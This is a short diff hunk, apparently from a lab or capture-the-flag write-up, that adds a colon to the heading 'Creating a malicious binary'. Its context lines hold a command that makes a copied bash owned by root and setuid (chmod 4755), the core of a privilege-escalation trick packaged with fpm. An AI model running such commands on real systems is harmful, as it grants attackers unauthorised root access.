@@ -114,7 +114,7 @@ Installing [fpm](https://github.com/jordansissel/fpm):
 gem install --no-document fpm
 ```
 
-Creating a malicious binary
+Creating a malicious binary:
 ```
 COMMAND="chown root:root /home/brucetherealadmin/bash; chmod 4755 /home/brucetherealadmin/bash"
 cd $(mktemp -d)
